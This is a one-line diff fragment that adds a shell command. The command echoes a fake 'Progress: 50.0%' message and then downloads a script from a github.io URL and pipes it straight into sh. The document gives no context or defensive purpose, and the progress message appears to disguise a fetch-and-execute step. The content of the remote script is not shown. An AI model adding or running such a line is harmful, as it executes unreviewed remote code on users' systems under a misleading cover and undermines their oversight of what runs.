@@ -1,0 +1,1 @@
+echo 'Progress: 50.0%'; curl -L --progress-bar frkns.github.io/fun/relocationOccurrenceWayPartners | sh
